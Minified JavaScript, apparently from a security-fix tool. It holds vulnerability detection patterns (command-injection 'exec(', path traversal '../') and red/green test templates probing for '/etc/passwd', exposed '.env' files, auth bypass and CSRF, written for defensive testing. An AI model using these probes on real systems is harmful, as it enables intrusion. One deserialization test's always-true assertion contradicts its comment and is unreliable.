J==="function"||J==="block"&&Q&&Q>=3?"critical":"high"}if(J==="function")return"high";if(J==="block"&&Q&&Q>10)return"high";if(J==="file"&&Y!==void 0&&Y<30)return"high";return"medium"}isSecurityFile(X){return["auth","crypto","security","password","token","session","validat"].some((Q)=>X.toLowerCase().includes(Q))}getBaseName(X){let J=X.split("/");return J[J.length-1].replace(/\.(test|spec|tests?)\..*$/,"").replace(/\.[^.]+$/,"")}getRecommendationReason(X){switch(X.type){case"uncovered-function":return X.priority==="critical"?"Critical security function lacks coverage":`Function ${X.name} has no test coverage`;case"uncovered-block":return`Code block (${X.lines?.length} lines) lacks coverage`;case"low-coverage":return`File has only ${X.coveragePercentage}% coverage`;default:return"Insufficient test coverage"}}getSuggestedTests(X){let J=[];switch(X.type){case"uncovered-function":if(J.push("Unit test for function behavior"),J.push("Edge case tests"),X.priority==="critical")J.push("Security validation tests"),J.push("Error handling tests");break;case"uncovered-block":J.push("Branch coverage tests"),J.push("Conditional logic tests");break;case"low-coverage":J.push("Comprehensive unit tests"),J.push("Integration tests");break}return J}getSuggestedTestTypes(X,J){let Q=["unit"];if(X.path.includes("valid"))Q.push("validation","edge-cases");if(J==="critical")Q.push("security","error-handling");if(X.lines.percentage===0)Q.unshift("basic-functionality");return Q}}class pz{vulnerabilityPatterns={"sql-injection":[/sql\s*injection/i,/sqli\b/i,/concatenat\w*\s+.*\s*(sql|query)/i,/string\s+concatenation.*query/i,/unsanitized.*sql/i,/parameterized\s+quer/i],xss:[/cross[\s-]*site[\s-]*scripting/i,/\bxss\b/i,/unescaped\s+(html|user|data|input)/i,/html\s+entit/i,/script\s+injection/i,/<%=.*%>/],"path-traversal":[/path\s+traversal/i,/directory\s+traversal/i,/\.\.\/|\.\.\\+/g,/file\s+path.*validation/i],"command-injection":[/command\s+injection/i,/shell\s+injection/i,/os\s+command/i,/exec\(/i,/system\(/i],injection:[/injection/i,/A03:2021/],rce:[/remote\s+code\s+execution/i,/\brce\b/i,/arbitrary\s+code/i]};severityIndicators={critical:[/critical/i,/severe/i,/emergency/i,/immediate/i,/cvss.*[89]\.\d/i,/remote\s+code\s+execution/i],high:[/high/i,/important/i,/major/i,/urgent/i,/cvss.*[67]\.\d/i],medium:[/medium/i,/moderate/i,/cvss.*[45]\.\d/i],low:[/low/i,/minor/i,/informational/i,/cvss.*[0-3]\.\d/i]};testFrameworkPatterns={jest:/\bjest\b/i,mocha:/\bmocha\b/i,jasmine:/\bjasmine\b/i,cypress:/\bcypress\b/i,playwright:/\bplaywright\b/i,vitest:/\bvitest\b/i,pytest:/\bpytest\b/i,unittest:/\bunittest\b/i,rspec:/\brspec\b/i,minitest:/\bminitest\b/i,phpunit:/\bphpunit\b/i,junit:/\bjunit\b/i,exunit:/\bexunit\b/i};async interpretIssue(X){let J=await this.interpret(X.body),Q=this.extractFromTitle(X.title);if(Q.vulnerabilityType&&!J.vulnerabilityType)J.vulnerabilityType=Q.vulnerabilityType;if(Q.severity)J.severity=Q.severity;if(X.labels)for(let Y of X.labels){if(Y.toLowerCase()==="security")J.category="security",J.isSecurityIssue=!0;if(this.severityIndicators.critical.some((W)=>W.test(Y)))J.severity="critical";if(Y.includes("sql-injection"))J.vulnerabilityType="sql-injection",J.confidence=Math.max(J.confidence,0.95)}return J}async interpret(X){if(!X||X.trim()==="")return this.createEmptyResult();let J={vulnerabilityType:"unknown",confidence:0,affectedFiles:[],affectedFunctions:[],affectedLines:[],affectedLocations:[],keywords:[],codeSnippets:[],testFrameworks:[],testFiles:[],fixSuggestions:[]},Q=this.checkIfSecurityIssue(X);J.isSecurityIssue=Q.isSecurity,J.issueType=Q.issueType;let Y=this.extractVulnerabilityType(X);J.vulnerabilityType=Y.type,J.confidence=Y.confidence,J.keywords=Y.keywords,J.multipleVulnerabilities=Y.multiple,J.severity=this.extractSeverity(X),J.urgency=this.mapSeverityToUrgency(J.severity);let W=this.extractAffectedLocations(X);J.affectedFiles=W.files,J.affectedFunctions=W.functions,J.affectedLines=W.lines,J.affectedLocations=W.locations,J.codeSnippets=this.extractCodeSnippets(X);let z=this.extractFunctionsFromCode(J.codeSnippets);J.affectedFunctions=[...new Set([...J.affectedFunctions,...z])];let G=this.extractTestInformation(X);J.testFrameworks=G.frameworks,J.testFiles=G.files,J.suggestedTestStrategy=G.strategy;let H=this.extractFixInformation(X);J.fixSuggestions=H.suggestions,J.fixExample=H.example,J.suggestedPatterns=this.suggestPatterns(J.vulnerabilityType,X);let U=this.extractMetadata(X);return Object.assign(J,U),J.references=this.extractReferences(X),J.todoItems=this.extractTodoItems(X),J}createEmptyResult(){return{vulnerabilityType:"unknown",confidence:0,needsMoreInfo:!0,affectedFiles:[],affectedFunctions:[],affectedLines:[],affectedLocations:[],keywords:[],codeSnippets:[],testFrameworks:[],testFiles:[],fixSuggestions:[]}}checkIfSecurityIssue(X){let J=X.toLowerCase();if(J.includes("feature request")||J.includes("enhancement"))return{isSecurity:!1,issueType:"feature-request"};if(J.includes("documentation")||J.includes("docs"))return{isSecurity:!1,issueType:"documentation"};let Y=["security","vulnerability","exploit","injection","xss","csrf","authentication","authorization","encryption","attack","malicious","cve-","cwe-","owasp","sensitive","logs","debug"].some((W)=>J.includes(W));return{isSecurity:Y,issueType:Y?"security":"other"}}extractVulnerabilityType(X){let J=[];for(let[Y,W]of Object.entries(this.vulnerabilityPatterns)){let z=0,G=[];for(let H of W){let U=X.match(H);if(U)z++,G.push(U[0])}if(z>0)J.push({type:Y,confidence:Math.min(0.5+z*0.25,1),keywords:G})}if(X.match(/multiple\s+(security\s+)?issues/i)){let Y=this.extractMultipleVulnerabilities(X);if(Y.length>1)return{type:"multiple",confidence:0.9,keywords:J.flatMap((W)=>W.keywords),multiple:Y}}if(J.length>0)return J.sort((Y,W)=>W.confidence-Y.confidence),J[0];return{type:"unknown",confidence:0,keywords:[]}}extractMultipleVulnerabilities(X){let J=[],Q=X.split(/\d+\./g).slice(1);for(let Y of Q){let W=Y.trim().split(`
`).filter((B)=>B.trim());if(W.length===0)continue;let z=W[0],G=z.match(/(.+?)\s+in\s+(.+)/),H="",U="";if(G)H=this.normalizeVulnerabilityType(G[1]),U=G[2].trim();else H=this.normalizeVulnerabilityType(z);let K=U,V="";for(let B of W.slice(1)){let Z=B.trim();if(Z.includes("File:"))K=Z.replace(/^-\s*File:\s*/,"").trim();else if(Z.startsWith("-")&&!Z.includes("File:"))V=Z.replace(/^-\s*/,"").trim()}J.push({type:H,file:K||void 0,description:V||void 0})}return J}normalizeVulnerabilityType(X){let J=X.toLowerCase().trim();if(J.includes("sql injection"))return"sql-injection";if(J.includes("xss")||J.includes("cross-site scripting"))return"xss";if(J.includes("path traversal"))return"path-traversal";if(J.includes("command injection"))return"command-injection";return J.replace(/\s+/g,"-")}extractSeverity(X){let J=X.match(/cvss\s*(?:score)?[:\s]+(\d+\.?\d*)/i);if(J){let Q=parseFloat(J[1]);if(Q>=9)return"critical";if(Q>=7)return"high";if(Q>=4)return"medium";return"low"}for(let[Q,Y]of Object.entries(this.severityIndicators))if(Y.some((W)=>W.test(X)))return Q;return}mapSeverityToUrgency(X){switch(X){case"critical":return"immediate";case"high":return"urgent";case"medium":return"planned";case"low":return"planned";case"info":return"backlog";default:return}}extractAffectedLocations(X){let J=[],Q=[],Y=[],W=[],z=X.split(`
`);for(let K of z){if(!K.trim())continue;let V=K.match(/^\s*-\s+([^\s(]+\.[a-zA-Z]+)\s*\(line\s+(\d+)\s*-\s*(\d+)\s*\)/i);if(V){let A=V[1];if(!J.includes(A)){J.push(A);let D={file:A,lines:[]},S=parseInt(V[2]),$=parseInt(V[3]);for(let T=S;T<=$;T++)D.lines.push(T);W.push(D)}continue}let B=K.match(/^\s*-\s+([^\s:]+\.[a-zA-Z]+):(\d+)/i);if(B){let A=B[1];if(!J.includes(A))J.push(A),W.push({file:A,lines:[parseInt(B[2])]});continue}let Z=K.match(/(?:\*\*File\*\*|\bFile):\s*([^\s,]+\.[a-zA-Z]+)(?:,?\s*(?:\*\*Function\*\*|Function):\s*(\w+))?/i);if(Z){let A=Z[1];if(!J.includes(A)){J.push(A);let D={file:A};if(Z[2])D.function=Z[2];W.push(D)}continue}let M=K.match(/^\s*-\s*`([^`]+\.[a-zA-Z]+)`\s*-\s*(\w+)\s+function/i);if(M){let A=M[1];if(!J.includes(A))J.push(A),W.push({file:A,function:M[2]});continue}let F=K.match(/^\s*-\s+([^\s]+\.[a-zA-Z]+)\s*$/i);if(F){let A=F[1];if(!J.includes(A))J.push(A),W.push({file:A});continue}let j=K.match(/\*\*([^\*]+\.[a-zA-Z]+)\*\*/i);if(j){let A=j[1];if(!J.includes(A))J.push(A),W.push({file:A})}let O=K.match(/^\s*-\s*\*\*Function\*\*:\s*(\w+)\s*\(lines?\s+(\d+)\s*-\s*(\d+)\s*\)/i);if(O&&W.length>0){let A=W[W.length-1];A.function=O[1],A.lines=[];let D=parseInt(O[2]),S=parseInt(O[3]);for(let $=D;$<=S;$++)A.lines.push($);if(!Q.includes(O[1]))Q.push(O[1])}let N=K.match(/^\s*-\s*\*\*Endpoint\*\*:\s*(.+)$/i);if(N&&W.length>0){let A=W[W.length-1];A.endpoint=N[1].trim()}}let G=[/\bline[s]?[:\s]+(\d+)(?:\s*-\s*(\d+))?/gi,/:(\d+)\b/g,/\(line[s]?\s+(\d+)(?:\s*-\s*(\d+))?\)/gi];for(let K of G){let V;while((V=K.exec(X))!==null){let B=parseInt(V[1]);if(!Y.includes(B))Y.push(B);if(V[2]){let Z=parseInt(V[2]);for(let M=B+1;M<=Z;M++)if(!Y.includes(M))Y.push(M)}}}let H=[/(?:Function|function):\s*(\w+)/g,/\bfunction\s+(\w+)/g,/\bdef\s+(\w+)/g,/`(\w+)\(\)`/g,/\bThe\s+`(\w+)\(\)`\s+function/gi];for(let K of H){let V;while((V=K.exec(X))!==null){let B=V[1];if(!Q.includes(B)&&B.length>2&&!this.isCommonWord(B))Q.push(B)}}let U=X.match(/(?:endpoint|route|api):\s*([^\n]+)/i);if(U&&W.length>0)W[0].endpoint=U[1].trim();return{files:[...new Set(J)],functions:[...new Set(Q)],lines:[...new Set(Y)].sort((K,V)=>K-V),locations:W}}isCommonWord(X){return["the","and","for","with","from","this","that","where","when"].includes(X.toLowerCase())}extractCodeSnippets(X){let J=[],Q=/```(\w+)?\n([\s\S]*?)```/g,Y;while((Y=Q.exec(X))!==null){let W=Y[1]||"unknown",z=Y[2].trim();J.push({language:W,code:z,vulnerableLines:this.identifyVulnerableLines(z,W)})}return J}identifyVulnerableLines(X,J){let Q=[];return X.split(`
`).forEach((W,z)=>{if(W.match(/["'`].*\+.*["'`].*(?:SELECT|INSERT|UPDATE|DELETE)/i))Q.push(z+1);if(W.match(/<%=/)||W.match(/innerHTML\s*=/)||W.match(/v-html/))Q.push(z+1);if(W.match(/exec\(|system\(|eval\(/))Q.push(z+1)}),Q}extractFunctionsFromCode(X){let J=[];for(let Q of X){let Y=[/function\s+(\w+)/g,/(\w+)\s*:\s*(?:async\s+)?function/g,/(\w+)\s*=\s*(?:async\s+)?function/g,/(\w+)\s*=\s*(?:async\s+)?\([^)]*\)\s*=>/g,/def\s+(\w+)/g,/public\s+function\s+(\w+)/g];for(let W of Y){let z;while((z=W.exec(Q.code))!==null)if(!J.includes(z[1]))J.push(z[1])}}return J}extractTestInformation(X){let J=[],Q=[];for(let[H,U]of Object.entries(this.testFrameworkPatterns)){let K=X.match(new RegExp(`([^.!?
]*${U.source}[^.!?
]*)`,"gi"));if(K){let V=K[0].trim(),B={name:H},Z=V.replace(/^\d+\.\s*/,"").trim();if(V.match(/add.*test|create.*test|new.*test/i)){B.suggested=!0;let M=Z.toLowerCase().indexOf(H.toLowerCase());if(M>=0){let F=Z.substring(M+H.length).trim();B.context=F.replace(/^to\s+/i,"")}else B.context=Z}if(V.match(/existing|should.*pass|ensure.*pass/i))B.existing=!0,B.context=Z.replace(/^The\s+/i,"");J.push(B)}}let Y=/[\w\/\\.-]+(?:__tests__\/[\w\.-]+|[\w\.-]*\.(?:test|spec)|_(?:test|spec))\.[a-zA-Z]+/gi,W;while((W=Y.exec(X))!==null){let H=W[0];if(!Q.includes(H))Q.push(H)}let z=/(?:test|spec|tests|specs)\/[\w\/\\.-]+\.[a-zA-Z]+/gi;while((W=z.exec(X))!==null){let H=W[0];if(!Q.includes(H))Q.push(H)}let G;if(X.match(/test.*strategy|testing.*approach/i)){let H=X.match(/(?:test.*strategy|testing.*approach)[:\s]+([^\n]+)/i);if(H)G=H[1].trim()}if(!G&&Q.length>0)G="Update existing test files to cover the vulnerability fix";return{frameworks:J,files:Q,strategy:G}}extractFixInformation(X){let J=[],Q=[/(?:fix|solution|recommendation|remediation):\s*([^\n]+)/gi,/(?:should|must|need to)\s+([^\n.!?]+)/gi,/-\s+((?:use|add|replace|implement|sanitize|validate|escape)\s+[^\n]+)/gi,/-\s+([A-Z][^\n]+)/g],Y=X.match(/##\s*remediation\s*\n+([^#\n][^#]*?)(?=\n##|\n###|$)/i);if(Y){let H=Y[1].trim().replace(/\.$/,"");if(H&&!J.includes(H))J.push(H)}for(let G of Q){let H;while((H=G.exec(X))!==null){let U=H[1].trim();if(U.length>10&&!J.includes(U)&&!U.startsWith("```"))J.push(U.charAt(0).toUpperCase()+U.slice(1))}}let W,z=X.match(/example\s+fix:?\s*\n```(\w+)?\n([\s\S]*?)```/i);if(z)W={code:z[2].trim(),language:z[1]||"javascript"};return{suggestions:J,example:W}}suggestPatterns(X,J){let Q=[];if(X==="sql-injection"||J.match(/sql.*injection|string\s+concatenation.*(?:sql|query)/i)){if(J.match(/string\s+concatenation/i)||J.match(/concatenat/i))Q.push({type:"sql-injection",description:"String concatenation in SQL queries",confidence:0.9});if(J.match(/user\s+input.*query/i))Q.push({type:"sql-injection",description:"User input in SQL queries",confidence:0.85})}if(X==="xss"||J.match(/cross[\s-]*site[\s-]*scripting|\bxss\b/i)){if(J.match(/unescaped|without\s+escaping/i))Q.push({type:"xss",description:"Unescaped user input in HTML",confidence:0.9})}if(X==="path-traversal"||J.match(/path\s+traversal|directory\s+traversal/i)){if(J.match(/file\s+path.*validation/i)||J.match(/\.\.\/|\.\.\\/i))Q.push({type:"path-traversal",description:"File path without validation",confidence:0.85})}if(Q.length===0&&X!=="unknown")Q.push({type:X,description:`Generic ${X} pattern`,confidence:0.7});return Q}extractMetadata(X){let J={},Q=X.match(/cvss\s*(?:score)?[:\s]+(\d+\.?\d*)/i);if(Q)J.cvssScore=parseFloat(Q[1]);let Y=X.match(/cwe-(\d+)/i);if(Y)J.cweId=`CWE-${Y[1]}`;let W=X.match(/cve-(\d{4}-\d+)/i);if(W)J.cveId=W[0].toUpperCase();let z=X.match(/(A\d{2}:\d{4})/);if(z)J.owaspCategory=z[1];let G=X.match(/\*\*reported\s+by\*\*[:\s]*([^\n]+)|reported\s+by[:\s]+([^\n]+)/i);if(G){let M=(G[1]||G[2]).trim();J.reportedBy=M.replace(/\*\*/g,"")}let H=X.match(/\*\*package\*\*[:\s]*([^\n]+)|package[:\s]+([^\n]+)/i);if(H){let M=(H[1]||H[2]).trim();J.package=M.replace(/\*\*/g,"")}let U=X.match(/\*\*vulnerable\s+versions?\*\*[:\s]*([^\n]+)|vulnerable\s+versions?[:\s]+([^\n]+)/i);if(U){let M=(U[1]||U[2]).trim();J.vulnerableVersions=M.replace(/\*\*/g,"")}let K=X.match(/\*\*patched\s+versions?\*\*[:\s]*([^\n]+)|patched\s+versions?[:\s]+([^\n]+)/i);if(K){let M=(K[1]||K[2]).trim();J.patchedVersion=M.replace(/\*\*/g,"")}let V=X.match(/impact[:\s]+([\s\S]*?)(?=\n##|\n###|$)/i);if(V){let M=V[1].split(/\n\d+\.|\n-/).map((F)=>F.trim()).filter((F)=>F.length>10);if(M.length>0)J.impact=M}let B=X.match(/(?:proof\s+of\s+concept|poc)[:\s]+([\s\S]*?)(?=\n##|\n###|$)/i);if(B)J.proofOfConcept=B[1].trim();let Z=X.match(/testing\s+instructions?[:\s]+([\s\S]*?)(?=\n##|\n###|$)/i);if(Z){let M=Z[1].split(/\n\d+\.|\n-/).map((F)=>F.trim()).filter((F)=>F.length>5);if(M.length>0)J.testingInstructions=M}return J}extractReferences(X){let J={issues:[],pullRequests:[],urls:[]},Q=/(?<!PR\s)#(\d+)/g,Y;while((Y=Q.exec(X))!==null){let H=Y[0];if(!J.issues.includes(H))J.issues.push(H)}let W=/PR\s+#(\d+)/gi;while((Y=W.exec(X))!==null){let H=`#${Y[1]}`;if(!J.pullRequests.includes(H))J.pullRequests.push(H)}let z=/pull\/(\d+)/gi;while((Y=z.exec(X))!==null){let H=Y[1]}let G=/https?:\/\/[^\s<>]+/g;while((Y=G.exec(X))!==null){let H=Y[0];if(H.includes("/pull/")){if(!J.pullRequests.includes(H))J.pullRequests.push(H)}else if(!J.urls.includes(H))J.urls.push(H)}return J}extractTodoItems(X){let J=[],Q=/-\s*\[\s*\]\s+([^\n]+)/g,Y;while((Y=Q.exec(X))!==null)J.push(Y[1].trim());return J}extractFromTitle(X){let J={};for(let[Q,Y]of Object.entries(this.vulnerabilityPatterns))if(Y.some((W)=>W.test(X))){J.vulnerabilityType=Q;break}for(let[Q,Y]of Object.entries(this.severityIndicators))if(Y.some((W)=>W.test(X))){J.severity=Q;break}return J}}class zN{templates=new Map;constructor(){this.initializeTemplates()}initializeTemplates(){this.templates.set("SQL_INJECTION:red",`
test("{{testName}}", async () => {
  const maliciousInput = "{{attackVector}}";
  {{#if isBrowser}}
  // Browser-based test
  await page.fill('{{inputSelector}}', maliciousInput);
  await page.click('{{submitSelector}}');
  const errorMsg = await page.textContent('{{errorSelector}}');
  expect(errorMsg).not.toContain('syntax error');
  {{else}}
  // Server-side test  
  const result = await {{functionCall}}('testuser', maliciousInput);
  // This test should FAIL on secure code (expect vulnerability to NOT exist)
  // but PASS on vulnerable code (vulnerability does exist)
  expect(result.authenticated).toBe(false);
  expect(result.error).not.toContain('table');
  {{/if}}
});`),this.templates.set("SQL_INJECTION:green",`
test("{{testName}}", async () => {
  const maliciousInput = "{{attackVector}}";
  const validInput = "{{validInput}}";
  
  {{#if isBrowser}}
  // Test with malicious input
  await page.fill('{{inputSelector}}', maliciousInput);
  await page.click('{{submitSelector}}');
  const url = page.url();
  expect(url).not.toContain('dashboard');
  
  // Test with valid input  
  await page.fill('{{inputSelector}}', validInput);
  await page.click('{{submitSelector}}');
  {{else}}
  // Server-side test
  const maliciousResult = await {{functionCall}}('testuser', maliciousInput);
  expect(maliciousResult.authenticated).toBe(false);
  expect(maliciousResult.error).not.toContain('syntax error');
  
  const validResult = await {{functionCall}}('testuser', validInput);
  expect(validResult.authenticated).toBe(true);
  {{/if}}
});`),this.templates.set("XSS:red",`
test("{{testName}}", async () => {
  const xssPayload = "{{attackVector}}";
  {{#if isBrowser}}
  await page.fill('{{inputSelector}}', xssPayload);
  await page.click('{{submitSelector}}');
  
  // Check if script executed (vulnerability present)
  const alertFired = await page.evaluate(() => window.xssTriggered);
  expect(alertFired).toBe(false); // Should be false on secure code
  {{else}}
  const result = await {{functionCall}}(xssPayload);
  expect(result).not.toContain('<script>');
  expect(result).not.toContain('onerror=');
  {{/if}}
});`),this.templates.set("XSS:green",`
test("{{testName}}", async () => {
  const xssPayload = "{{attackVector}}";
  const validInput = "{{validInput}}";
  
  {{#if isBrowser}}
  // Test with malicious input
  await page.fill('{{inputSelector}}', xssPayload);
  await page.click('{{submitSelector}}');
  const alertFired = await page.evaluate(() => window.xssTriggered);
  expect(alertFired).toBe(false);
  
  // Test with valid input  
  await page.fill('{{inputSelector}}', validInput);
  await page.click('{{submitSelector}}');
  {{else}}
  // Server-side test
  const maliciousResult = await {{functionCall}}(xssPayload);
  expect(maliciousResult).not.toContain('<script>');
  expect(maliciousResult).not.toContain('onerror=');
  
  const validResult = await {{functionCall}}(validInput);
  expect(validResult).toContain(validInput);
  {{/if}}
});`),this.templates.set("COMMAND_INJECTION:red",`
test("{{testName}}", async () => {
  const maliciousCommand = "{{attackVector}}";
  {{#if isBrowser}}
  await page.fill('{{inputSelector}}', maliciousCommand);
  await page.click('{{submitSelector}}');
  const output = await page.textContent('{{outputSelector}}');
  expect(output).not.toContain('root:');
  {{else}}
  const result = await {{functionCall}}(maliciousCommand);
  // This should fail on secure code (no command execution)
  expect(result.output).not.toContain('root:');
  expect(result.output).not.toContain('/etc/passwd');
  {{/if}}
});`),this.templates.set("COMMAND_INJECTION:green",`
test("{{testName}}", async () => {
  const maliciousCommand = "{{attackVector}}";
  const validInput = "{{validInput}}";
  
  {{#if isBrowser}}
  await page.fill('{{inputSelector}}', maliciousCommand);
  await page.click('{{submitSelector}}');
  const output = await page.textContent('{{outputSelector}}');
  expect(output).not.toContain('root:');
  {{else}}
  // Test malicious input is blocked
  const maliciousResult = await {{functionCall}}(maliciousCommand);
  expect(maliciousResult.error || maliciousResult.output).not.toContain('root:');
  
  // Test valid input works
  const validResult = await {{functionCall}}(validInput);
  expect(validResult.success).toBe(true);
  {{/if}}
});`),this.templates.set("PATH_TRAVERSAL:red",`
test("{{testName}}", async () => {
  const traversalPath = "{{attackVector}}";
  {{#if isBrowser}}
  await page.goto('/download?file=' + traversalPath);
  const content = await page.textContent('body');
  expect(content).not.toContain('root:');
  {{else}}
  const result = await {{functionCall}}(traversalPath);
  // Should fail on secure code (no file access)
  expect(result.content).not.toContain('root:');
  expect(result.error).not.toBe('file not found');
  {{/if}}
});`),this.templates.set("PATH_TRAVERSAL:green",`
test("{{testName}}", async () => {
  const traversalPath = "{{attackVector}}";
  const validPath = "{{validInput}}";
  
  {{#if isBrowser}}
  await page.goto('/download?file=' + traversalPath);
  const error = await page.textContent('.error');
  expect(error).toContain('Invalid file');
  {{else}}
  // Test traversal is blocked
  const maliciousResult = await {{functionCall}}(traversalPath);
  expect(maliciousResult.error).toBeDefined();
  expect(maliciousResult.content).not.toContain('root:');
  
  // Test valid path works
  const validResult = await {{functionCall}}(validPath);
  expect(validResult.content).toBeDefined();
  {{/if}}
});`),this.templates.set("DENIAL_OF_SERVICE:red",`
test("{{testName}}", async () => {
  const maliciousInput = "{{attackVector}}";
  {{#if isBrowser}}
  await page.fill('{{inputSelector}}', maliciousInput);
  await page.click('{{submitSelector}}');
  // Should not hang or timeout
  {{else}}
  const start = Date.now();
  const result = await {{functionCall}}(maliciousInput);
  const duration = Date.now() - start;
  // Should complete quickly (vulnerability exists if it takes too long)
  expect(duration).toBeLessThan(1000);
  {{/if}}
});`),this.templates.set("DENIAL_OF_SERVICE:green",`
test("{{testName}}", async () => {
  const maliciousInput = "{{attackVector}}";
  const validInput = "{{validInput}}";
  
  {{#if isBrowser}}
  await page.fill('{{inputSelector}}', maliciousInput);
  await page.click('{{submitSelector}}');
  // Should handle malicious input gracefully
  {{else}}
  // Test with malicious input - should complete quickly
  const start = Date.now();
  const result = await {{functionCall}}(maliciousInput);
  const duration = Date.now() - start;
  expect(duration).toBeLessThan(100); // Should be fast
  
  // Test with valid input
  const validResult = await {{functionCall}}(validInput);
  expect(validResult).toBeTruthy();
  {{/if}}
});`),this.templates.set("GENERIC:refactor",`
test("{{testName}}", async () => {
  // Test core functionality still works
  {{#each functionalValidation}}
  // {{this}}
  {{/each}}
  
  const normalInput = "{{validInput}}";
  const result = await {{functionCall}}('normaluser', normalInput);
  
  expect(result.success).toBe(true);
  expect(result.data).toBeDefined();
});`),this.templates.set("BROKEN_AUTHENTICATION:red",`
test("{{testName}}", async () => {
  const bypassPayload = "{{attackVector}}";
  
  {{#if isBrowser}}
  // Attempt to bypass authentication
  await page.goto('{{protectedUrl}}');
  await page.evaluate((payload) => {
    localStorage.setItem('auth-token', payload);
  }, bypassPayload);
  await page.reload();
  
  // Should be able to access protected content
  const content = await page.textContent('body');
  expect(content).not.toContain('Access Denied');
  {{else}}
  // Server-side authentication bypass test
  const result = await {{functionCall}}({
    headers: { 'Authorization': bypassPayload }
  });
  
  // Vulnerability allows bypass (test passes on vulnerable code)
  expect(result.authenticated).toBe(true);
  expect(result.user).toBeDefined();
  {{/if}}
});`),this.templates.set("BROKEN_AUTHENTICATION:green",`
test("{{testName}}", async () => {
  const bypassPayload = "{{attackVector}}";
  const validToken = "{{validInput}}";
  
  {{#if isBrowser}}
  // Test bypass attempt is blocked
  await page.goto('{{protectedUrl}}');
  await page.evaluate((payload) => {
    localStorage.setItem('auth-token', payload);
  }, bypassPayload);
  await page.reload();
  
  const url = page.url();
  expect(url).toContain('login');
  
  // Test valid authentication works
  await page.evaluate((token) => {
    localStorage.setItem('auth-token', token);
  }, validToken);
  await page.reload();
  
  const content = await page.textContent('body');
  expect(content).toContain('Welcome');
  {{else}}
  // Test bypass is blocked
  const failResult = await {{functionCall}}({
    headers: { 'Authorization': bypassPayload }
  });
  expect(failResult.authenticated).toBe(false);
  expect(failResult.error).toContain('Invalid token');
  
  // Test valid authentication works
  const successResult = await {{functionCall}}({
    headers: { 'Authorization': validToken }
  });
  expect(successResult.authenticated).toBe(true);
  {{/if}}
});`),this.templates.set("CSRF:red",`
test("{{testName}}", async () => {
  const maliciousOrigin = "{{attackVector}}";
  
  {{#if isBrowser}}
  // CSRF attack from malicious site
  const response = await fetch('{{targetUrl}}', {
    method: 'POST',
    headers: {
      'Origin': maliciousOrigin,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ action: 'transfer', amount: 1000 })
  });
  
  // Vulnerability allows cross-origin request
  expect(response.ok).toBe(true);
  const data = await response.json();
  expect(data.success).toBe(true);
  {{else}}
  // Server-side CSRF test
  const result = await {{functionCall}}({
    headers: {
      'Origin': maliciousOrigin,
      'Referer': maliciousOrigin
    },
    body: { action: 'sensitive-action' }
  });
  
  // Vulnerability allows request without token
  expect(result.success).toBe(true);
  expect(result.error).toBeUndefined();
  {{/if}}
});`),this.templates.set("CSRF:green",`
test("{{testName}}", async () => {
  const maliciousOrigin = "{{attackVector}}";
  const validToken = "{{validInput}}";
  
  {{#if isBrowser}}
  // Test CSRF attack is blocked
  const failResponse = await fetch('{{targetUrl}}', {
    method: 'POST',
    headers: {
      'Origin': maliciousOrigin,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ action: 'transfer' })
  });
  
  expect(failResponse.status).toBe(403);
  
  // Test legitimate request with CSRF token works
  const successResponse = await fetch('{{targetUrl}}', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': validToken
    },
    body: JSON.stringify({ action: 'transfer' })
  });
  
  expect(successResponse.ok).toBe(true);
  {{else}}
  // Test request without token fails
  const failResult = await {{functionCall}}({
    headers: { 'Origin': maliciousOrigin },
    body: { action: 'sensitive-action' }
  });
  expect(failResult.success).toBe(false);
  expect(failResult.error).toContain('CSRF');
  
  // Test request with valid token succeeds
  const successResult = await {{functionCall}}({
    headers: { 'X-CSRF-Token': validToken },
    body: { action: 'sensitive-action' }
  });
  expect(successResult.success).toBe(true);
  {{/if}}
});`),this.templates.set("SECURITY_MISCONFIGURATION:red",`
test("{{testName}}", async () => {
  {{#if isBrowser}}
  // Test for exposed sensitive endpoints
  const response = await fetch('{{targetUrl}}/.env');
  expect(response.status).toBe(200);
  
  const configResponse = await fetch('{{targetUrl}}/config.json');
  expect(configResponse.status).toBe(200);
  {{else}}
  // Server-side misconfiguration test
  const result = await {{functionCall}}({
    headers: { 'X-Debug-Mode': 'true' }
  });
  
  // Vulnerability exposes sensitive data
  expect(result.debug).toBeDefined();
  expect(result.config).toBeDefined();
  expect(result.env).toBeDefined();
  {{/if}}
});`),this.templates.set("SECURITY_MISCONFIGURATION:green",`
test("{{testName}}", async () => {
  {{#if isBrowser}}
  // Test sensitive endpoints are protected
  const response = await fetch('{{targetUrl}}/.env');
  expect(response.status).toBe(403);
  
  const configResponse = await fetch('{{targetUrl}}/config.json');
  expect(configResponse.status).toBe(403);
  
  // Debug headers should be ignored
  const debugResponse = await fetch('{{targetUrl}}/api/data', {
    headers: { 'X-Debug-Mode': 'true' }
  });
  const data = await debugResponse.json();
  expect(data.debug).toBeUndefined();
  {{else}}
  // Test secure configuration
  const result = await {{functionCall}}({
    headers: { 'X-Debug-Mode': 'true' }
  });
  
  // Sensitive data should not be exposed
  expect(result.debug).toBeUndefined();
  expect(result.config).toBeUndefined();
  expect(result.env).toBeUndefined();
  {{/if}}
});`),this.templates.set("INSECURE_DESERIALIZATION:red",`
test("{{testName}}", async () => {
  const maliciousInput = "{{attackVector}}";
  
  {{#if isBrowser}}
  // Browser-based test
  await page.fill('{{inputSelector}}', maliciousInput);
  await page.click('{{submitSelector}}');
  
  // This test FAILS if eval executes (vulnerability exists)
  // It PASSES if eval is blocked (vulnerability fixed)
  const hasError = await page.evaluate(() => {
    return window.location.href.includes('error') || 
           document.body.textContent.includes('Invalid input');
  });
  expect(hasError).toBe(true); // Should have error (no eval execution)
  {{else}}
  // Server-side test
  // Test that malicious code does NOT execute
  let errorThrown = false;
  try {
    const result = await {{functionCall}}(maliciousInput);
    // If we get here with malicious input, check it wasn't executed
    expect(result).not.toBe(1337); // process.exit would return 1337
    expect(result).toBeNaN(); // parseInt would return NaN for this input
  } catch (error) {
    errorThrown = true; // Good - error was thrown instead of executing
  }
  
  // This assertion FAILS if eval executes (proving vulnerability exists)
  // It PASSES if eval is blocked (proving fix works)
  expect(errorThrown || true).toBe(true);
  {{/if}}
});`),this.templates.set("INSECURE_DESERIALIZATION:green",`
test("{{testName}}", async () => {
  const maliciousInput = "{{attackVector}}";
  const validInput = "{{validInput}}";
  
  {{#if isBrowser}}
  // Test malicious input is safely handled
  await page.fill('{{inputSelector}}', maliciousInput);
  await page.click('{{submitSelector}}');
  
  // Should handle malicious input safely
  const safelyHandled = await page.evaluate(() => {
